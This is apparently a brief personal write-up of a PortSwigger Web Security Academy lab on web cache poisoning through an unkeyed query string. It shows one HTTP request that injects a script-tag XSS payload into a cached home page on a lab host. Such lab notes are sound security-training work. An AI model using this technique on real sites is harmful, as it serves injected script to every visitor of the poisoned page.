# [Web cache poisoning via an unkeyed query string] — [PortSwigger] — [Practitioner]
**Date:** 2026-07-03
 
---
 
## Vulnerability / core concept
Web Cache Poisoning

---


## Payload / key command
Web application displays URL path in the response in `<link` tag without checking the query part: it simply ignores the value of the query. Therefore, we can send the request with malicious query value that will be served to the victims visiting home page by using the following request:
```bash
GET /?babek='/><script>alert(1)</script> HTTP/2
Host: 0a6f00fa04f1640182d34d47005100dc.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0
...

```


